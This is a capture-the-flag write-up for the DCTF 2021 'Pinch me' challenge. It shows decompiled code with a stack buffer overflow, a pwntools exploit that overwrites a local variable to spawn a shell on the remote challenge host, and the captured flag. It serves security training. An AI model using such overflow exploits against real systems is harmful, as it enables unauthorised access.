# DCTF 2021

## Pinch me

> 100
> 
> This should be easy! 
> 
> `nc dctf1-chall-pinch-me.westeurope.azurecontainer.io 7480`
>
> [pinch\_me](pinch_me)

Tags: _pwn_ _x86-64_ _bof_ _variable-overwrite_


## Summary

Overwrite a variable to get a shell.


## Analysis

### Decompile with Ghidra

```c
void vuln(void)
{
  char local_28 [24];
  int local_10;
  int local_c;
  
  local_c = 0x1234567;
  local_10 = -0x76543211;
  puts("Is this a real life, or is it just a fanta sea?");
  puts("Am I dreaming?");
  fgets(local_28,100,stdin);
  if (local_10 == 0x1337c0de) {
    system("/bin/sh");
  }
  else {
    if (local_c == 0x1234567) {
      puts("Pinch me!");
    }
    else {
      puts("Pinch me harder!");
    }
  }
  return;
}
```

`fgets` will accept up to `100` bytes overwriting `local_10`.  To get a shell, set `local_10` to `0x1337c0de`.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./pinch_me')

if args.REMOTE:
    p = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)
else:
    p = process(binary.path)

payload  = b''
payload += (0x28 - 0x10) * b'A'
payload += p64(0x1337c0de)

p.sendlineafter('?\n',payload)
p.interactive()
```

Should be obvious how this works.  If confused by `0x28 - 0x10`, then look at the Ghidra stack diagram.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/dctf2021/pinch_me/pinch_me'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to dctf1-chall-pinch-me.westeurope.azurecontainer.io on port 7480: Done
[*] Switching to interactive mode
Am I dreaming?
$ cat flag.txt
dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}
```
